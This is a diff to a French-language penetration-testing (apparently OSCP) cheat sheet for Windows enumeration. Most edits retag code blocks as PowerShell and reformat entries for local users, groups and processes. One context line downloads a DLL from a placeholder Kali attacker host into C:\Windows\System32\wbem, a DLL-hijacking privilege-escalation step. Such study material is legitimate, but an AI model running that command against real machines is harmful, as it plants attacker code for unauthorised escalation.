@@ -16,28 +16,36 @@ Auditer les services, jetons et configurations d'un poste Windows.
 
 <p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
 
-```text
+```powershell
 whoami
 ```
 
 
-**Paramètres et repères :**
-`Get-LocalUser`  
-
-
 **Utilisateurs locaux**
 
+<p class="oscp-command-note">Lister les comptes utilisateurs locaux.</p>
 
-**Paramètres et repères :**
-`Get-LocalGroup`  
+```powershell
+Get-LocalUser
+```
+
+
 
 
 **Groupes locaux**
 
+<p class="oscp-command-note">Lister les groupes locaux de Windows.</p>
+
+```powershell
+Get-LocalGroup
+```
+
+
+
 
 <p class="oscp-command-note">Lister les groupes locaux Windows.</p>
 
-```text
+```powershell
 net localgroup
 ```
 
@@ -54,7 +62,7 @@ Get-LocalGroupMember -GroupName [GroupName]
 
 <p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
-```text
+```powershell
 systeminfo
 ```
 
@@ -64,21 +72,21 @@ systeminfo
 
 <p class="oscp-command-note">Afficher la configuration réseau Windows.</p>
 
-```text
+```powershell
 ipconfig /all
 ```
 
 
 <p class="oscp-command-note">Afficher ou modifier les routes réseau.</p>
 
-```text
+```powershell
 route print
 ```
 
 
 <p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
-```text
+```powershell
 netstat -ano
 ```
 
@@ -95,7 +103,7 @@ Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVers
 
 <p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>
 
-```sql
+```powershell
 Select-Object -Property DisplayName
 ```
 
@@ -109,23 +117,20 @@ Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstal
 
 <p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>
 
-```sql
+```powershell
 Select-Object -Property DisplayName
 ```
 
 
-**Paramètres et repères :**
-`Get-Process`  
-
-
 **Processus actifs**
 
+<p class="oscp-command-note">Lister les processus et afficher leur nom ainsi que leur chemin.</p>
 
-
-
-```sql
-Select-Object -Property ProcessName, Path
+```powershell
+Get-Process | Select-Object -Property ProcessName, Path
 ```
+
+
 
 
 **Comptes de service**
@@ -2472,7 +2477,7 @@ C:\
 
 <p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
-```text
+```powershell
 systeminfo
 ```
 
@@ -2521,7 +2526,7 @@ iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll
 
 <p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
-```text
+```powershell
 systeminfo
 ```
 
